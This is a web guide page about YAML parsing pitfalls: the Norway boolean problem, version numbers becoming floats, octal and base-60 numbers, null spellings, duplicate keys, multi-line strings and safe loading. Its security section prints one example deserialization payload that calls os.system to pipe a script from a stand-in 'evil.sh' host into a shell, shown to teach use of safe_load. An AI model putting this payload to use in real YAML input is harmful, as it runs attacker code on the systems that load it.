@@ -1,0 +1,197 @@
+{{HEADER}}
+
+  <nav class="crumbs" aria-label="Breadcrumb">
+    <a href="../">Home</a>
+    <span class="sep">/</span>
+    <a href="../blog.html">Guides</a>
+    <span class="sep">/</span>
+    <span aria-current="page">YAML gotchas</span>
+  </nav>
+
+  <article class="article">
+    <header class="article-head">
+      <span class="article-kicker">Configuration &amp; Data Formats</span>
+      <h1>YAML's Sharpest Edges: The Norway Problem and Friends</h1>
+      <p class="article-standfirst">YAML was designed to be human-friendly, and it succeeds — until an unquoted country code for Norway becomes the boolean <code>false</code>, a version number loses a digit, or a phone number turns into base-60 arithmetic. These are not parser bugs. They are the specification working as written.</p>
+      <div class="article-meta">
+        <span class="byline">Layerbit Engineering</span>
+        <span><i data-lucide="calendar"></i>Published 8 September 2026</span>
+        <span><i data-lucide="clock"></i>10 min read</span>
+      </div>
+    </header>
+
+    <div class="takeaways">
+      <h2><i data-lucide="list-checks"></i> The short version</h2>
+      <ul>
+        <li>Under YAML 1.1 — still the default in many parsers — <code>no</code>, <code>off</code>, <code>y</code> and <code>n</code> are booleans. Norway's country code <code>NO</code> becomes <code>false</code>.</li>
+        <li><code>1.10</code> parses as the number 1.1. Version strings need quotes.</li>
+        <li>Leading zeros can trigger octal parsing, so <code>0755</code> becomes 493 and <code>08</code> may fail outright.</li>
+        <li>Always use <code>yaml.safe_load()</code>. The unsafe loader can construct arbitrary Python objects.</li>
+      </ul>
+    </div>
+
+    <div class="prose">
+      <h2 id="versions">First, which YAML are you using?</h2>
+      <p>Most YAML confusion traces back to a version mismatch nobody chose deliberately. YAML 1.1 was published in 2005; YAML 1.2 arrived in 2009 and deliberately tightened type resolution, partly to make JSON a strict subset of YAML.</p>
+      <p>The catch is that widely used libraries did not all follow. PyYAML — by far the most common Python implementation — implements YAML 1.1 by default and has done for its entire life. So the behaviours below are not historical curiosities; they are live in production today.</p>
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Implementation</th><th>Spec version</th></tr></thead>
+          <tbody>
+            <tr><td>PyYAML (<code>yaml.safe_load</code>)</td><td>1.1</td></tr>
+            <tr><td>ruamel.yaml</td><td>1.2 by default</td></tr>
+            <tr><td>js-yaml (v4+)</td><td>1.2</td></tr>
+            <tr><td>Go <code>gopkg.in/yaml.v3</code></td><td>1.2 (with some 1.1 leniency)</td></tr>
+            <tr><td>SnakeYAML (Java)</td><td>1.1 historically, 1.2 in recent engines</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h2 id="norway">The Norway problem</h2>
+      <p>YAML 1.1 resolves an impressively long list of bare words to booleans:</p>
+      <pre><code>true:   y Y yes Yes YES  true True TRUE  on On ON
+false:  n N no  No  NO   false False FALSE off Off OFF</code></pre>
+      <p>Which produces the famous failure. A list of ISO country codes:</p>
+      <pre><code>countries:
+  - GB
+  - FR
+  - DE
+  - NO      # Norway
+  - SE</code></pre>
+      <p>parses in YAML 1.1 as:</p>
+      <pre><code>{"countries": ["GB", "FR", "DE", False, "SE"]}</code></pre>
+      <p>Norway has become <code>false</code>. Downstream, a country lookup fails, a switch statement falls through to a default, or a database insert writes a zero. Nothing errored — the data is simply wrong in a way that is nearly invisible in a diff.</p>
+      <p>The same applies to any field that can legitimately contain those tokens. Single-letter answers (<code>y</code>/<code>n</code>) in a survey schema. Chemical element symbols — <code>N</code> for nitrogen, <code>Y</code> for yttrium. A `state` field containing <code>ON</code> for Ontario. A serial number that happens to read <code>OFF</code>.</p>
+      <div class="callout warn">
+        <div class="callout-title"><i data-lucide="alert-triangle"></i> The rule that prevents all of it</div>
+        <p>Quote every string whose value is not under your control, and quote every string that could plausibly be read as another type. <code>"NO"</code> is unambiguously a string in every YAML version. Bare <code>NO</code> is a coin flip decided by someone else's library version.</p>
+      </div>
+
+      <h2 id="numbers">Numbers that quietly change shape</h2>
+      <h3>Version strings lose precision</h3>
+      <pre><code>version: 1.10        # → 1.1  (a float, trailing zero gone)
+version: "1.10"      # → "1.10"  correct
+version: 1.2.3       # → "1.2.3"  a string, because it is not a valid number</code></pre>
+      <p>This one is nastier than it looks because it is inconsistent: <code>1.2.3</code> stays a string (two dots cannot be a float), but <code>1.10</code> becomes a float and loses its trailing zero. So a config that works fine for <code>1.2.3</code> breaks the moment someone pins <code>1.10</code>, and the error surfaces far from the YAML file.</p>
+
+      <h3>Leading zeros and octal</h3>
+      <pre><code>mode: 0755           # YAML 1.1 → 493 (octal!)   YAML 1.2 → 755 (decimal)
+mode: 0o755          # YAML 1.2 octal → 493
+zip: 01234           # → 668 under 1.1 octal rules
+zip: "01234"         # → "01234"  correct
+month: 08            # 1.1: error - 8 is not a valid octal digit</code></pre>
+      <p>File permissions in YAML are a genuine trap: Ansible and Kubernetes manifests both deal in modes like <code>0644</code>, and whether that means 420 or 644 depends on the parser. Both tools document quoting it as a string for exactly this reason.</p>
+
+      <h3>Sexagesimal — base 60</h3>
+      <p>YAML 1.1 supports colon-separated base-60 integers, intended for durations:</p>
+      <pre><code>duration: 1:30       # → 90        (1×60 + 30)
+time: 22:22          # → 1342      (22×60 + 22)
+mac: 00:1B:44:11:3A  # → string (letters make it unparseable as base 60)</code></pre>
+      <p>So <code>22:22</code> as a time-of-day value silently becomes 1342. YAML 1.2 removed sexagesimal entirely, but PyYAML still honours it. Any colon-separated numeric value — times, durations, partial MAC addresses, version ranges — must be quoted.</p>
+
+      <h2 id="nulls">Null has five spellings</h2>
+      <pre><code>a: null
+b: Null
+c: NULL
+d: ~
+e:            # empty value is also null
+f: ""         # this one is an empty string, not null</code></pre>
+      <p>The distinction between <code>e</code> and <code>f</code> matters constantly. In Kubernetes and most schema validators, a null field means "unset — apply the default" while an empty string means "explicitly set to nothing". Deleting the value after a colon and deleting the value <em>and</em> providing <code>""</code> are different operations with different effects.</p>
+
+      <h2 id="duplicates">Duplicate keys: invalid, yet accepted</h2>
+      <p>The specification says mapping keys must be unique. In practice:</p>
+      <pre><code>service:
+  port: 8080
+  port: 9090     # spec violation</code></pre>
+      <p>PyYAML silently keeps the <strong>last</strong> value. js-yaml throws. Go's yaml.v3 errors in strict mode. So the same file produces port 9090, an exception, or a rejection depending on the runtime — and the most common Python behaviour is the silent one. This matters when config files are assembled from templates or concatenated fragments, where a duplicate is easy to introduce and impossible to spot in review.</p>
+
+      <div class="tool-cta">
+        <div class="cta-copy">
+          <h3>See exactly what your YAML parses to</h3>
+          <p>Layerbit's YAML ↔ JSON Converter shows the parsed structure as JSON, where types are explicit and unambiguous. If a string became a boolean or a version lost a digit, it is immediately visible. Everything runs locally in your browser.</p>
+        </div>
+        <a class="cta-btn" href="../tools/yaml-json-converter.html"><i data-lucide="refresh-ccw"></i> Open YAML ↔ JSON</a>
+      </div>
+
+      <h2 id="strings">Multi-line strings and the chomping indicators</h2>
+      <p>YAML offers two block styles and three chomping modes, and the combination decides exactly which newlines survive:</p>
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Form</th><th>Newlines inside</th><th>Trailing newline</th></tr></thead>
+          <tbody>
+            <tr><td><code>|</code> literal</td><td>Preserved</td><td>Exactly one</td></tr>
+            <tr><td><code>|-</code> literal, strip</td><td>Preserved</td><td>None</td></tr>
+            <tr><td><code>|+</code> literal, keep</td><td>Preserved</td><td>All of them</td></tr>
+            <tr><td><code>&gt;</code> folded</td><td>Folded to spaces</td><td>Exactly one</td></tr>
+            <tr><td><code>&gt;-</code> folded, strip</td><td>Folded to spaces</td><td>None</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>The one that causes real incidents is a trailing newline in a secret. An API key written as:</p>
+      <pre><code>apiKey: |
+  sk_live_abc123</code></pre>
+      <p>produces <code>"sk_live_abc123\n"</code>. The request fails authentication, the error says "invalid key", and you spend an hour checking the key character by character — all correct — because the problem is the invisible character at the end. Use <code>|-</code> for anything that must not carry a trailing newline, or simply quote it inline.</p>
+
+      <h3>Quoting styles behave differently</h3>
+      <pre><code>a: 'it''s \n literal'    # single: only '' is escaped; \n stays two characters
+b: "line\nbreak"         # double: \n becomes a real newline
+c: bare string           # no escapes processed at all</code></pre>
+      <p>Single quotes are the safest default for opaque values: no escape processing means no surprises from stray backslashes in Windows paths or regex patterns.</p>
+
+      <h2 id="security">Loading YAML is a security decision</h2>
+      <p>YAML supports typed tags, and some loaders will happily instantiate objects from them:</p>
+      <pre><code>!!python/object/apply:os.system ["curl evil.sh | sh"]</code></pre>
+      <p>Passed to PyYAML's <code>yaml.load()</code> with the unsafe loader, that executes. This is why <code>yaml.load()</code> without an explicit <code>Loader=</code> has been deprecated and warns loudly — but plenty of older code and tutorials still call it.</p>
+      <div class="callout warn">
+        <div class="callout-title"><i data-lucide="shield-alert"></i> One rule</div>
+        <p>Use <code>yaml.safe_load()</code> — or <code>yaml.load(text, Loader=yaml.SafeLoader)</code> — for any YAML you did not author yourself. Treat a YAML file from a user upload, a webhook, or a third-party repository exactly as you would treat a pickle: as code, not data.</p>
+      </div>
+      <p>There is also a denial-of-service angle. Anchors and aliases allow a document to reference itself repeatedly, and nesting those references multiplies the expansion — the "billion laughs" attack, in a few hundred bytes of input. Most hardened parsers now cap alias expansion, but if you accept YAML from outside, impose a size limit and a parse timeout as well.</p>
+
+      <h2 id="checklist">A YAML review checklist</h2>
+      <ol>
+        <li>Quote every value that is semantically a string, especially two-letter codes, versions, modes, times and IDs.</li>
+        <li>Quote anything with a leading zero.</li>
+        <li>Quote anything containing a colon followed by digits.</li>
+        <li>Use <code>|-</code> for secrets and tokens so no trailing newline sneaks in.</li>
+        <li>Spaces for indentation — tabs are forbidden by the spec and produce baffling errors.</li>
+        <li><code>safe_load</code>, always, for input you did not write.</li>
+        <li>Round-trip through JSON in review: if the types are not what you expected, fix the YAML now.</li>
+      </ol>
+      <p>That last step is the highest-leverage habit. YAML's type inference is invisible in the source file and explicit in JSON, so converting is the fastest way to see what a parser actually built. It is the difference between reading what you <em>meant</em> and reading what you <em>wrote</em>.</p>
+
+      <h2 id="closing">Human-friendly is not the same as unambiguous</h2>
+      <p>None of this makes YAML a bad format. Being able to write a config file without counting brackets is a real benefit, and the comment support alone justifies it over JSON for hand-edited files. But the friendliness comes from guessing what you meant, and every guess is a place where the format can be wrong in a way that does not look wrong.</p>
+      <p>Quote defensively, pin your parser's spec version if you can, and verify the parsed types rather than trusting the source text. The cost is a few extra quotation marks; the alternative is finding out about Norway in production.</p>
+
+      <div class="further">
+        <h2>Related guides and tools</h2>
+        <div class="further-grid">
+          <a class="further-card" href="../tools/yaml-json-converter.html">
+            <strong>YAML ↔ JSON Converter</strong>
+            <span>Convert both ways and inspect the real parsed types.</span>
+          </a>
+          <a class="further-card" href="csv-edge-cases.html">
+            <strong>Why CSV is not really a format</strong>
+            <span>Embedded commas, quotes, newlines and the Excel problem.</span>
+          </a>
+          <a class="further-card" href="../tools/json-validator.html">
+            <strong>JSON Validator &amp; Formatter</strong>
+            <span>Validate the converted output and explore it as a tree.</span>
+          </a>
+        </div>
+      </div>
+    </div>
+  </article>
+
+  <a href="../" id="smartBackBtn" class="fab" aria-label="Command Center" title="Command Center">
+    <svg width="26" height="26" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="filter: drop-shadow(0 0 8px rgba(56, 189, 248, 0.5));">
+      <path d="M12 2L2 7l10 5 10-5-10-5z" stroke="#38bdf8" stroke-width="2" stroke-linejoin="round" fill="rgba(56,189,248,0.2)"/>
+      <path d="M2 17l10 5 10-5M2 12l10 5 10-5" stroke="#94a3b8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+  </a>
+
+  {{FOOTER}}
+
+  <script src="../js/shared.js"></script>
+  <script src="../main.js"></script>
